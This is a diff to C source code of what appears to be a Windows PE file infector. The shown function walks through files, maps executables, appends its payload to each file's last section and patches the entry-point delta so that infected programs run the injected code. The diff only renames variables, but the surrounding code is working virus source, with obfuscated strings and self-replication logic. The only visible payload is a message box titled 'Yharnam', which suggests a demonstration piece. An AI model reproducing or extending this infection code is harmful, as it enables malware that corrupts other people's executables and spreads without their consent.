@@ -4,7 +4,7 @@
 #include "payload.h"
 #include "utils.h"
 
-INJECTED_CODE VOID run_payload(IN CONST HMODULE hKernel32Dll, IN CONST PCBYTE pPayloadEnc) {
+INJECTED_CODE VOID run_payload(IN CONST HMODULE hKernel32Dll, IN CONST PCBYTE pPayloadData) {
     // Declare obfuscated strings for the rest of the function
     DECLARE_OBFUSCATED(user32, "USER32.DLL");              // DLL to load for MessageBoxA
     DECLARE_OBFUSCATED(mbTitle, "Yharnam");                // MessageBoxA title
@@ -132,7 +132,7 @@ INJECTED_CODE VOID run_payload(IN CONST HMODULE hKernel32Dll, IN CONST PCBYTE pP
     PIMAGE_SECTION_HEADER pSection, pLastSection;
     DWORD dwLastSectionPtr, dwLastSectionSize, dwLastSectionRva, dwLastSectionEnd, dwOrigEntryPoint;
     WORD wNbSectionsMin1;  // Number of sections minus 1 (for array indexing)
-    PBYTE pPayloadData;
+    PBYTE pPayloadDest;
 
     do {
         if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
@@ -253,7 +253,7 @@ INJECTED_CODE VOID run_payload(IN CONST HMODULE hKernel32Dll, IN CONST PCBYTE pP
 
         pSection = IMAGE_FIRST_SECTION(pNtHeader);
         pLastSection = &pSection[wNbSectionsMin1];
-        pPayloadData = (PBYTE)pMapAddress + dwLastSectionPtr + dwLastSectionSize;
+        pPayloadDest = (PBYTE)pMapAddress + dwLastSectionPtr + dwLastSectionSize;
 
         pLastSection->Misc.VirtualSize = dwLastSectionSize + code_size;
         pLastSection->SizeOfRawData += dwSizeAligned;
@@ -273,8 +273,8 @@ INJECTED_CODE VOID run_payload(IN CONST HMODULE hKernel32Dll, IN CONST PCBYTE pP
             dwLastSectionEnd + (LONG)((PCBYTE)&payload - (PCBYTE)&__payload_start);
 
         // Inject the payload and update the entry point delta
-        my_memcpy(pPayloadData, pPayloadEnc, code_size);
-        *(PLONGLONG)(pPayloadData + ((PCBYTE)&delta_start - (PCBYTE)&__payload_start)) =
+        my_memcpy(pPayloadDest, pPayloadData, code_size);
+        *(PLONGLONG)(pPayloadDest + ((PCBYTE)&delta_start - (PCBYTE)&__payload_start)) =
             (LONGLONG)dwOrigEntryPoint - (LONGLONG)pNtHeader->OptionalHeader.AddressOfEntryPoint;
 
         pFlushViewOfFile(pMapAddress, 0);
